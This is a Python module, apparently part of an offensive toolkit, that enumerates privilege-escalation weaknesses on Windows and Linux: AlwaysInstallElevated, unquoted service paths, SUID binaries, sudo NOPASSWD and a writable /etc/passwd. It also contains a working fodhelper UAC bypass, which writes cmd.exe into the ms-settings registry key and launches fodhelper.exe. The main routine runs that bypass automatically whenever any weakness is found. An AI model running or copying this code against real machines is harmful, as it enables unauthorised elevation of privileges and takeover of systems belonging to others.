import os
import sys
import platform
import subprocess
import logging
from datetime import datetime
import ctypes

def is_admin():
    """Check if current process has admin/root privileges"""
    try:
        if platform.system() == 'Windows':
            return ctypes.windll.shell32.IsUserAnAdmin()
        else:
            return os.geteuid() == 0
    except Exception:
        return False

def check_windows_vulnerabilities():
    """Check for common Windows privilege escalation vulnerabilities"""
    vulnerabilities = []
    
    # Check for AlwaysInstallElevated
    try:
        import winreg
        hkcu = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer")
        hklm = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer")
        if winreg.QueryValueEx(hkcu, "AlwaysInstallElevated")[0] == 1 and \
           winreg.QueryValueEx(hklm, "AlwaysInstallElevated")[0] == 1:
            vulnerabilities.append({
                'type': 'AlwaysInstallElevated',
                'description': 'MSI files can be installed with elevated privileges'
            })
    except:
        pass

    # Check for unquoted service paths
    try:
        import wmi
        c = wmi.WMI()
        for service in c.Win32_Service():
            if service.PathName and ' ' in service.PathName and not service.PathName.startswith('"'):
                vulnerabilities.append({
                    'type': 'UnquotedServicePath',
                    'service': service.Name,
                    'path': service.PathName
                })
    except:
        pass

    return vulnerabilities

def check_linux_vulnerabilities():
    """Check for common Linux privilege escalation vulnerabilities"""
    vulnerabilities = []
    
    # Check SUID binaries
    try:
        suid_bins = subprocess.check_output("find / -perm -4000 2>/dev/null", shell=True).decode().split('\n')
        if suid_bins:
            vulnerabilities.append({
                'type': 'SUID_binaries',
                'binaries': [b for b in suid_bins if b]
            })
    except:
        pass

    # Check sudo permissions
    try:
        sudo_perms = subprocess.check_output("sudo -l", shell=True).decode()
        if sudo_perms and 'NOPASSWD' in sudo_perms:
            vulnerabilities.append({
                'type': 'sudo_nopasswd',
                'permissions': sudo_perms
            })
    except:
        pass

    # Check for writable /etc/passwd
    try:
        if os.access('/etc/passwd', os.W_OK):
            vulnerabilities.append({
                'type': 'writable_passwd',
                'description': '/etc/passwd is writable'
            })
    except:
        pass

    return vulnerabilities

def attempt_uac_bypass():
    """Attempt to bypass Windows UAC"""
    if platform.system() != 'Windows':
        return {
            'status': 'error',
            'error': 'UAC bypass only available on Windows',
            'timestamp': datetime.now().isoformat()
        }

    try:
        # Attempt fodhelper bypass
        import winreg
        cmd = "C:\\Windows\\System32\\cmd.exe"
        registry_path = "Software\\Classes\\ms-settings\\shell\\open\\command"
        
        # Create registry structure
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_path)
        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, cmd)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # Trigger UAC bypass
        subprocess.Popen("fodhelper.exe")
        
        # Cleanup
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, registry_path)
        
        return {
            'status': 'success',
            'message': 'UAC bypass attempted',
            'timestamp': datetime.now().isoformat()
        }
    except Exception as e:
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        }

def attempt_privilege_escalation():
    """Main function to attempt privilege escalation"""
    try:
        # Check current privileges
        if is_admin():
            return {
                'status': 'info',
                'message': 'Already running with elevated privileges',
                'timestamp': datetime.now().isoformat()
            }

        results = {
            'timestamp': datetime.now().isoformat(),
            'platform': platform.system(),
            'vulnerabilities': []
        }

        # Check for vulnerabilities based on OS
        if platform.system() == 'Windows':
            results['vulnerabilities'] = check_windows_vulnerabilities()
            # Attempt UAC bypass if vulnerabilities found
            if results['vulnerabilities']:
                uac_result = attempt_uac_bypass()
                results['uac_bypass'] = uac_result
        else:
            results['vulnerabilities'] = check_linux_vulnerabilities()

        if results['vulnerabilities']:
            return {
                'status': 'success',
                'message': 'Vulnerabilities found',
                'data': results,
                'timestamp': datetime.now().isoformat()
            }
        else:
            return {
                'status': 'info',
                'message': 'No obvious privilege escalation vulnerabilities found',
                'data': results,
                'timestamp': datetime.now().isoformat()
            }

    except Exception as e:
        logging.error(f"Error during privilege escalation attempt: {str(e)}")
        return {
            'status': 'error',
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        } 